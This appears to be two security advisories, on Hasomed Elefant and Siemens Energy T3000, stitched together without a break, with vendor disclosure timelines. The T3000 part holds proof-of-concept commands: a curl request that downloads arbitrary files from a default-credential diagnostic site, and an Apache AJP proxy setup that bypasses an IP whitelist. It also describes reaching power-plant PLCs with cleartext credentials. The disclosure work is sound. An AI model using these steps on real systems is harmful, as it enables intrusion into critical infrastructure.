-Path \"exec.exe\" -Destination \"PostESUUpdate.exe\"\n}\n}\n------------------------------------------------------------------------------\n\n6) Hardcoded Service Password (CVE-2024-50593)\nTo use certain restricted functions in the Elefant Service Software it is\nrequired to enter a hotline password.\n\n<hardcoded_service_1.png>\n\nThis password is hardcoded into the Elefant Service binary, which is shipped\nwith the software:\n\n<hardcoded_service_2.png>\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following version has been tested which was the latest version available\nat the time of the test:\n* Elefant 24.02.02\n* Elefant Software Updater 1.2.0.33679\n* Elefant Service 05.02.00\n\n\nVendor contact timeline:\n------------------------\n2024-07-01: Contacting vendor through security () hasomed de.\n2024-07-04: First vendor response.

In our testcase,\nthis level consisted of the Terminal Server that engineers could connect to. From here,\nthey start the T3000 application, which simply loads a browser and displays a Java\napplication served from the Application Server.\n\nAutomation Level: This level consists of application and automation servers. The application\nserver hosts the not time critical components of power generations such as the web server.\nThe automation servers are taking care of time critical operations. In our testcase these\nwere PLCs from the SIMATIC S7-CPU family.\n\nProcess Level: This level consists of the I/O modules that are controlled by the automation\nservers.\n\nThe Terminal Server, located on the operator level already contained the Puppet cache file,\nwhich contained all the local Windows users used in the T3000 system in clear text. As the\nTerminal Server communicates with the Application Server, they have to be connected via network.\nThus, the attacker can use the credentials on the Terminal Server to jump to the Application\nServer. This server is in the same segment as the physical PLC CPUs. Thus an attacker can now\nalso control the PLCs and thus the whole power plant.\n\nIn order to read the Puppet cache file, an attacker has to gain local admin rights first.\nFor this, vulnerability 1 can be used.\n\n\n3) File System Access via RemoteDiagnosticView Website (CVE-2024-38878)\nThe RemoteDiagnosticView website is hosted at the following URL:\n\nhttp:// <IP Application Server>:8080/RemoteDiagnosticView\n\nIn our testcase it was configured using default credentials with the following username and\nan easy to guess password:\n\ntxpadmin:[redacted]\n\nUsing these credentials an attacker gains an authenticated session. From there, one can\nsimply download arbitrary files:\n\n------------------------\nCurl -H \"Cookie: JSESSIONID=31B4F2F1BAFC473AB41B65DDF2FD10BA;\" -I -H \"Content-Type:\napplication/x-www-form-urlencoded\" -X POST -d \"filename=D:\\sectest.txt&type=TEXT\"\nhttp://$host:8080/RemoteDiagnosticView/DataServlet\n\n\nHTTP/1.1 200\nContent-Type: text/plain\nTransfer-Encoding: chunked\n[...]\n\nSectest\n---------------------------------\n\n\n4) IP Whitelist Bypass (CVE-2024-38879)\nThe AJP protocol can be used to proxy requests from an Apache server to an application\nrunning on Tomcat. By setting up a local Apache server and configuring it to use the\nAJP service of the Application Server, the IP filter is circumvented.\nThe following setup was built:\n\n------------------------------\nsudo apt-get install libapache2-mod-jk\nsudo vim /etc/apache2/apache2.conf\n# append the following line to the config\n   Include ajp.conf\nsudo vim /etc/apache2/ajp.conf\n# create the following file\n    ProxyRequests Off\n    <Proxy *>\n       Order deny,allow\n       Deny from all\n       Allow from localhost\n    </Proxy>\n    ProxyPass   / ajp://<Application Server IP>:8009/\n   ProxyPassReverse   / ajp://<Application Server IP>:8009/\nsudo a2enmod proxy_http\nsudo a2enmod proxy_ajp\nsudo systemctl restart apache2\n--------------------------\nAfterwards, the e.g. RemoteDiagnosticView can be loaded from http://127.0.0.1/RemoteDiagnosticView\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following version has been tested which was the latest version available\nat the time of the test:\n* 8.2\n\nAccording to the vendor (T3000 SE Controls Security Announcement 2024/01 Update 1),\nthe following versions and components are affected:\n\nAll T3000 Versions >= Release 8.2 SP3:\n* Security Server\n* Thin Clients\n* Terminal Server\n* Application Server\n* Domain Controller\n* PDM VM\n* Whitelisting VM\n* NIDS\n\n\nVendor contact timeline:\n------------------------\n2024-06-05: Contacting vendor through productcert () siemens com\n2024-06-06: Siemens assigned S-PCERT#40850\n2024-06-12: Reaching out to specific contacts at Siemens Energy Cybersecurity.\n2024-06-13: They confirm that ProductCERT will get back to us once they have a timeline.\n2024-06-19: Customer informs us about a Siemens Energy Document that recommends to\n            change passwords after installation. The document is called \"SE Controls\n            Security Announcement 2024/01\" but only available to T3000 customers.\n2024-06-20: Sending feedback about the document to Siemens Energy Cybersecurity\n            as in our opinion it does not solve the issues.\n2024-06-20: They confirm again that ProductCERT is taking care of issues. Asks\n            to confirm that we received their messages, which we didn't -> Realized\n            that one of our email addresses was dropped during the communication,\n            recovered emails from second account.\n2024-06-17/2024-06-24: ProductCERT informs:\n            Vulnerability 1 cannot be reproduced in the reference installation.\n                 The product team is working to find potentially affected installation\n                 scenarios.\n            Vulnerability 2 was reproduced and the product team is working on a mitigation.\n                 Also, a related customer information has been distributed to customers.\n            Vulnerability 3 will be fixed in the next release of the T3000 distribution\n            Vulnerability 4 is already fixed in the current version. The product team is\n                 investigating, if this vulnerability is present in still supported versions.\n2024-06-21: ProductCERT informs us that they are able to reproduce all of the vulnerabilities\n            and provide fixes for most of them. Advisory draft should be shared with\n            SEC Consult next week. Ask to keep communication directed at ProductCERT\n            instead of Cybersecurity team.\n2024-06-28: ProductCERT sends over advisory draft. Could reproduce all vulnerabilities\n            and requested CVEs.\n2024-07-03: Siemens ProductCERT requests if we received the draft, as SEC Consult didn't answer yet.\n2024-07-03: SEC Consult confirms the reception of the advisory draft.\n2024-07-04: Submitted feedback for advisory draft to ProductCERT. From SEC Consult's\n            understanding, changing passwords after initial installation only fixes the\n            cleartext passwords in log files. The puppet issue would not be fixed.\n            Thus SEC Consult proposed to split Vulnerability 2 into two separate findings.\n2024-07-05: ProductCERT forwarded feedback to product team.\n2024-08-02: ProductCERT publishes SSA-857368.\n2024-08-05: Informing ProductCERT of vacation/absences, will coordinate further afterwards.\n2024-10-03: Proposing a meeting with ProductCERT to clarify and discuss all open issues.\n2024-10-22: Meeting with ProductCERT.\n2024-10-24: ProductCERT sends us further documents for T3000 regarding fixes/mitigations.\n2024-10-31: Sending advisory draft to ProductCERT, proposing advisory release date for 7th\n            November.\n2024-11-06: Receiving feedback from ProductCERT, postponing release to 12th November.\n2024-11-12: Coordinated release of advisory.\n\n\nSolution:\n---------\nChange the passwords to all components.
